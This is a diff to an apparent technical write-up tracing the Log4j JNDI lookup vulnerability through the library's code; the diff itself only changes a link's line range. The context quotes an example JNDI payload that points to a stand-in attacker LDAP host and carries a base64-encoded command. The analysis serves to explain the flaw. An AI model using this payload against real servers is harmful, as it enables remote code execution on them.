@@ -45,7 +45,7 @@ https://sourcegraph.com/github.com/apache/logging-log4j2@rel/2.14.1/-/blob/log4j
 
 Further down the call stack, we get into the interpolation logic, which selects a lookup method based on the prefix of the name (`String var`, which contains the value `jndi:ldap://malicious.com:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=`):
 
-https://sourcegraph.com/github.com/apache/logging-log4j2@4b789c8/-/blob/log4j-core/src/main/java/org/apache/logging/log4j/core/lookup/Interpolator.java?L198-239
+https://sourcegraph.com/github.com/apache/logging-log4j2@4b789c8/-/blob/log4j-core/src/main/java/org/apache/logging/log4j/core/lookup/Interpolator.java?L212-239
 
 The `jndi` prefix selects for the JNDI lookup, which brings us into the `JNDIManager` class:
 
